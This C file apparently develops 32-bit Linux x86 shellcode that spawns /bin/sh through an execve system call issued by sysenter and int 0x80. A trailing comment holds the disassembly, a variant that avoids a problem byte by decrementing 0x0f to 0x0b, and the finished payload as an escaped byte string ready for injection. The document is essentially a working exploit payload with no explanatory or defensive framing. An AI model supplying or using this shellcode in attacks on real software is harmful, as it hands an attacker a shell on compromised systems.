#include <stdlib.h>

int main() {
        asm(
"xor %eax, %eax\n"
"push %eax\n"
"push $0x68732f2f\n"
"push $0x6e69622f\n"
"mov %esp, %ebx\n"
"push %eax\n"
"push %eax\n"
"push %ebx\n"
"mov %esp, %ecx\n"
"mov $0xb, %al\n"
"xor %edx, %edx\n"
"push %ecx\n"
"push %edx\n"
"push %ebp\n"
"mov %esp, %ebp\n"
"sysenter\n"
"int $0x80\n");
        return 0;
}

/*
 80483f0:	31 c0                	xor    %eax,%eax
 80483f2:	50                   	push   %eax
 80483f3:	68 2f 2f 73 68       	push   $0x68732f2f
 80483f8:	68 2f 62 69 6e       	push   $0x6e69622f
 80483fd:	89 e3                	mov    %esp,%ebx
 80483ff:	50                   	push   %eax
 8048400:	50                   	push   %eax
 8048401:	53                   	push   %ebx
 8048402:	89 e1                	mov    %esp,%ecx
 8048404:	b0 0b                	mov    $0xb,%al
 8048406:	31 d2                	xor    %edx,%edx
 8048408:	51                   	push   %ecx
 8048409:	52                   	push   %edx
 804840a:	55                   	push   %ebp
 804840b:	89 e5                	mov    %esp,%ebp
 804840d:	0f 34                	sysenter 
 804840f:	cd 80                	int    $0x80
 
31 c0
50
68 2f 2f 73 68
68 2f 62 69 6e
89 e3
50
50
53
89 e1
b0 0f
fe c8
fe c8
fe c8
fe c8
31 d2
51
52
55
89 e5
0f 34
cd 80
'1\xc0Ph//shh/bin\x89\xe3PPS\x89\xe1\xb0\x0f\xfe\xc8\xfe\xc8\xfe\xc8\xfe\xc81\xd2QRU\x89\xe5\x0f4\xcd\x80'
 */
